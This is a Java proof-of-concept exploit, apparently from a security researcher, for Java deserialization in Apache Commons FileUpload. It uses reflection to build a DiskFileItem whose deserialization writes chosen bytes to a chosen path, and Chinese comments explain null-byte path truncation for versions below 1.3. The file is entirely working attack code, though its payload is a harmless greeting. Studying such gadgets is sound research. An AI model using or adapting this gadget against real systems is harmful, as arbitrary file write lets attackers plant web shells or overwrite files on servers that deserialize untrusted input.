package org.h3rmesk1t.FileUpload;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/15 9:02 下午
 */
public class FileUploadExploit {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws Exception {

        // 创建文件写入目录 File 对象, 以及文件写入内容.
        byte[] bytes = "Hello, H3rmesk1t".getBytes(StandardCharsets.UTF_8);

        // 1.3 版本以下, 可以使用 \0 截断
        File repository = new File("/Users/h3rmesk1t/Desktop/FileUpload/hello.txt\0");

        // 1.3.1 及以上版本, 只能指定目录
        // File File repository = new File("/Users/h3rmesk1t/Desktop/FileUpload");

        // 创建 dfos 对象.
        DeferredFileOutputStream deferredFileOutputStream = new DeferredFileOutputStream(0, repository);

        // 使用 repository 初始化反序列化的 DiskFileItem 对象.
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        // 序列化时 writeObject 要求 dfos 不能为 null.
        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, deferredFileOutputStream);

        // 反射将 cachedContent 写入.
        Field cachedContentField = DiskFileItem.class.getDeclaredField("cachedContent");
        cachedContentField.setAccessible(true);
        cachedContentField.set(diskFileItem, bytes);

        // 序列化操作.
        String exp = serialize(diskFileItem);
        System.out.println(exp);

        // 反序列化操作.
        unserialize(exp);
    }
}
